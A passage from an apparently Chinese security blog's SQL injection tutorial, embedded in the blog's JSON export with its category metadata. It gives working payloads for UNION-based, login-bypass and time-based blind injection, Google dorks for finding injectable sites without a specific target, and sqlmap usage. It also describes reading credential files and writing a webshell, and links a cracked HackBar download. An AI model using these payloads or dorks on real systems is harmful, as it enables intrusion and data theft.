‘/path’Select load_file(‘path’)substr(‘str1’,index1,length) 测试URL：http://127.0.0.1/sql/Less-1/?id=-1%27%20union%20select%201,@@version_compile_os,@@datadir%23 逻辑运算符： AND OR注意：运算顺序从左到右 Select * from user where id =1 or 1=1 返回永远为真 登陆处的SQL语句：select * from users where username=’admin’ and possword=’passwd’ 万能登录用户名：’ or ‘1’ = ‘1 测试URL：select * from users where username=’’ or ‘1’ = ‘1’ and possword=’’ or ‘1’ = ‘1’ 判断返回值列数and 1=2 union select 1,2,3--+ select user() regexp &#39;&#39;^r0&#39; 时间延时常用语句if(ascii(substr(select user(),1,1))=114,0,sleep(5)) 五、SQL注入流程寻找SQL注入点 目标搜集 无特定目标：inurl:php?id= 有特定目标：inurl:php?id= site:target.com 工具爬取： spider（对搜索到的网站进行爬取，识别所有的动态页面） 注入识别 手工简单识别 &#39; and 1=1 / and 1=2 and &#39;1&#39;=&#39;1 / and &#39;1&#39;=&#39;2 and 1 like 1 / and 1 like 2 工具识别 Sqlmap -m filename（filename保存检测目标） sqlmap -crawl（对目标网站进行爬取并依次进行测试） 高级识别 扩展识别广度和深度 Sqlmap –level 增加测试级别，对header中相关参数进行测试 sqlmap -r filename 利用工具提高识别效率 BurpSuite + SqlMAo BurpSuite拦截所有浏览器访问提交的数据 BurpSuite扩展插件直接调用SQLmap进行测试 代码审计（白盒测试） 搜索关键代码和函数 梳理业务流程 SQL注入流程 信息收集（利用数据库内置函数） 数据库类型 报错页面 数据库版本 @@version、version() 数据库用户 user()、SYSTEM_USER 数据库权限 super_priv、IS_SRVROLEMEMBER 数据获取：获取库信息、表信息、列信息、数据信息 通过语句查询 通过暴力破解select * from &#39;爆破字段&#39; 提权 执行命令 SQLServer权限 读文件 读取中间件配置文件、数据库配置文件（可能存在账号密码等信息）读取数据库配置文件示例读取系统配置文件 写文件 写webshell到网站目录 六 、SQL手工注入方法MySQL数据库结构（重点：SQL层） SQL层具有的功能：解析器、查询执行、授权、查询告诉缓存、优化器、查询日志记录 判断语法、语句、语义 数据库对象授权情况判断 解析：将SQL语句解析成执行计划，运行执行计划，生成找数据的方式 优化：基于算法从执行计划中选择代价最小的 执行：执行计划 将取出的数据抽象成表 查询缓存：缓存之前查询的数据 MySQL内置库： 通过information_schema我们可以窥透整个MySQL的运行情况，也可以查看到数据库中所有的数据信息。 查询数据核心语法：（十分重要！！！） 功能名称 查询语句 查库 select schema_name from information_schema.schemata 查表 select table_name from information_schema.tables where table_schema=库名 查列 select column_name from information_schema.columns where table_name=表名 查数据 select 列名 from 库名.表名 MySQL手工注入方法 查库示例 查表示例 查列示例 查数据示例 需要注意的地方 所有类型sql注入，都是基于查库、表、列语句 如果数据太多，导致无法返回查询结果（可利用limit限定返回的数量或位置；用concat拼接） 利用limit限定返回的数量或位置示例： 利用concat拼接示例： 借助BurpSuite快速获取数据–布尔盲注 实战：SQLi-Labs/Less-1解题 测试是否存在sql注入 由于页面报错，因此很有可能是注入点。 通过上述测试，可以判断该页面存在SQL注入漏洞。 判断字段长度 由此可知，该字段长度为3 利用union联合查询库名 因此可以在图示2,34位置带入查询信息的语句 回显信息说明返回的内容太多，利用limit限定返回的数量或位置和利用group_concat()拼接 利用union联合查询表名 利用union联合查询列名 利用union联合查询数据 七、两款工具简介工具一：HackBarHackBar：一款Firefox浏览器下的黑客插件 安全人员可以十分方便的用来进行Sql注入以及Xss测试或进行各种编码功能等。 安装教程： 由于是收费软件，特此提供破解版本，侵删。链接: https://pan.baidu.com/s/1wCT5sbchTEv1SPLyGgRSeQ 提取码: 3i33 添加下载xpi文件 关闭HackBar自动更新（更新之后版本要收费） 按F12即可使用工具 ​ 我们可以点击Load URL将URL栏的地址加载到HackBar窗口中，可以利用HackBar工具栏提供了很多web开发相关的命令，像urlencode,urldecode等常见命令。 工具二：SQLmap（详解待补） SQLmap是一个自动化的SQL注入工具，其主要功能是扫描，发现并利用给定的URL的SQL注入漏洞，目前支持的数据库是MySQL，Oracle，PostgreSQL，Microsoft SQL Server，Microsoft Acess，IBM DB2，SQLLite，Firebird，Sybase和SAP MaxDB……SQLmap采用几种独特的SQL注入技术，分别是盲推理SQL注入，UNION查询SQL注入，对查询和盲注。其广泛的功能和选项包括数据库指纹，枚举，数据库提取，访问目标文件系统，并在获取完全操作权限时实行任意命令。","categories":[{"name":"网络安全","slug":"网络安全","permalink":"http://example.com/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"Web安全","slug":"网络安全/Web安全","permalink":"http://example.com/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"SQL","slug":"SQL","permalink":"http://example.com/tags/SQL/"},{"name":"Web安全","slug":"Web安全","permalink":"http://example.com/tags/Web%E5%AE%89%E5%85%A8/"}]}],"categories":[{"name":"hvv","slug":"hvv","permalink":"http://example.com/categories/hvv/"},{"name":"GK","slug":"GK","permalink":"http://example.com/categories/GK/"},{"name":"工具书","slug":"工具书","permalink":"http://example.com/categories/%E5%B7%A5%E5%85%B7%E4%B9%A6/"},{"name":"杂","slug":"杂","permalink":"http://example.com/categories/%E6%9D%82/"},{"name":"刷题记录","slug":"刷题记录","permalink":"http://example.com/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"},{"name":"OpenStack","slug":"OpenStack","permalink":"http://example.com/categories/OpenStack/"},{"name":"密码学","slug":"密码学","permalink":"http://example.com/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"},{"name":"Web安全","slug":"Web安全","permalink":"http://example.com/categories/Web%E5%AE%89%E5%85%A8/"},{"name":"Python安全编程","slug":"Python安全编程","permalink":"http://example.com/categories/Python%E5%AE%89%E5%85%A8%E7%BC%96%E7%A8%8B/"},{"name":"工具说明书","slug":"工具说明书","permalink":"http://example.com/categories/%E5%B7%A5%E5%85%B7%E8%AF%B4%E6%98%8E%E4%B9%A6/"},{"name":"网络安全","slug":"网络安全","permalink":"http://example.com/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"Web安全","slug":"网络安全/Web安全","permalink":"http://example.com/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/"},{"name":"网络基础","slug":"网络基础","permalink":"http://example.com/categories/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/"},{"name":"测试","slug":"测试","permalink":"http://example.com/categories/%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"Kali","slug":"Kali","permalink":"http://example.com/tags/Kali/"},{"name":"tool","slug":"tool","permalink":"http://example.com/tags/tool/"},{"name":"XSS","slug":"XSS","permalink":"http://example.com/tags/XSS/"},{"name":"http","slug":"http","permalink":"http://example.com/tags/http/"},{"name":"SQLMAP","slug":"SQLMAP","permalink":"http://example.com/tags/SQLMAP/"},{"name":"测试","slug":"测试","permalink":"http://example.com/tags/%E6%B5%8B%E8%AF%95/"},{"name":"SQL","slug":"SQL","permalink":"http://example.com/tags/SQL/"},{"name":"盲注","slug":"盲注","permalink":"http://example.com/tags/%E7%9B%B2%E6%B3%A8/"},{"name":"语法","slug":"语法","permalink":"http://example.com/tags/%E8%AF%AD%E6%B3%95/"},{"name":"Web安全","slug":"Web安全","permalink":"http://example.com/tags/Web%E5%AE%89%E5%85%A8/"}]}